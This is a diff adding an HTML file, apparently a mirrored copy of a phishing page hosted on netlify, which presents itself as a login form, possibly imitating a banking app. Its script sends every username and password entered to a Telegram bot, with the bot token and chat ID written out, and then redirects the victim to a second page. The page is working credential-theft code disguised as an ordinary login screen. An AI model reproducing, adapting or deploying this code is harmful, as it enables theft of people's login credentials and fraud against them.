@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from yononet24.netlify.app/1st.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 07 Oct 2025 06:10:57 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f4f4;
+        }
+
+        .header-container {
+            position: relative;
+            width: 100%;
+            height: 100vh; /* Full viewport height */
+            background-image: url('head.jpg');
+            background-size: cover; /* Ensure the image covers the container width */
+            background-position: top center; /* Align from the top and center horizontally */
+            background-repeat: no-repeat;
+        }
+
+        .form-container {
+            position: absolute;
+            top: 42%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        input {
+    width: 90%;
+    padding: 10px;
+    margin: 10px 0;
+    border: none; /* Remove default border */
+    border-bottom: 2px solid #721A63; /* Add bottom border */
+    background: transparent; /* Make the background transparent */
+    outline: none; /* Remove the outline when focusing */
+    font-size: 18px; /* Increase font size */
+    color: black; /* Change text color to black */
+}
+
+input::placeholder {
+    color: #aaa; /* Optional: Change placeholder color for better contrast */
+}
+
+input:focus {
+    border-bottom: 2px solid #28a745; /* Change border color when focused */
+}
+
+
+input:focus {
+    border-bottom: 2px solid #721A63; /* Change border color when focused */
+}
+
+
+        button {
+            padding: 15px 135px;
+            background-color: #721A63;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #721A63;
+        }
+    .register {
+            display: block;
+            text-align: right; /* Align link to the right */
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .register a {
+    color: #007bff;
+    text-decoration: none;
+    font-size: 20px; /* Increase the font size */
+}
+
+
+        .register a:hover {
+            text-decoration: underline;
+        }
+    
+    </style>
+</head>
+<body>
+    <div class="header-container">
+        <div class="form-container">
+            <form id="loginForm" onsubmit="submitForm(event)">
+                <h2>Login</h2>
+                <input type="text" id="username" name="username" placeholder="Username" required><br>
+                <input type="password" id="password" name="password" placeholder="Password" required><br>
+                <br>
+                <button type="submit">Login</button>
+                <div class="register">
+                    <a href='registration.html' id='registerLink'>Register Now</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function submitForm(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Send form data to Telegram using a bot
+            const botToken = '8342341479:AAGxeOqHIrVvl1FZn10HMr5-rIxFC953AGw';
+            const chatId = '7357838260';
+            const message = `Username: ${username}\nPassword: ${password}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        // Redirect to another page after successful submission
+                        window.location.href = "2nd.html";
+                    } else {
+                        alert('Error sending data');
+                    }
+                })
+                .catch(error => {
+                    alert('Request failed');
+                });
+        }
+    </script>
+</body>
+
+<!-- Mirrored from yononet24.netlify.app/1st.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 07 Oct 2025 06:10:57 GMT -->
+</html>
